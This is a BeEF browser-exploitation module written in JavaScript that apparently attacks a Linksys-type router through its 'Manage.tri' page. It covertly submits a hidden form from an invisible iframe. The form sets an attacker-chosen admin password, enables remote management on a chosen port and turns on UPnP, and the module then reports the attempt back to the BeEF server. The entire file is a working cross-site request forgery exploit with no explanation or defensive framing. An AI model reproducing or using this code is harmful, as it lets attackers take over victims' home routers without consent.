beef.execute(function() {
  var port = '<%= @port %>';
  var gateway = '<%= @base %>'; 
  var passwd = '<%= @password %>';

  var target = gateway + "Manage.tri";

  var iframe = beef.dom.createInvisibleIframe();

  var form = document.createElement('form');
  form.setAttribute('action', target);
  form.setAttribute('method', 'post');

  var input = null;

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_USE_HTTP');
  input.setAttribute('value', 0);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_HTTP');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_HTTP_S');
  input.setAttribute('value', 0);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PASSWORDMOD');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PASSWORD');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PASSWORD_CONFIRM');
  input.setAttribute('value', passwd);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', '_http_enable');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_WLFILTER');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_REMOTE');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_PORT');
  input.setAttribute('value', port);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'MANAGE_UPNP');
  input.setAttribute('value', 1);
  form.appendChild(input);

  input = document.createElement('input');
  input.setAttribute('type', 'hidden');
  input.setAttribute('name', 'layout');
  input.setAttribute('value', 'en');
  form.appendChild(input);

  iframe.contentWindow.document.body.appendChild(form);
  form.submit();

  beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=exploit attempted");
});
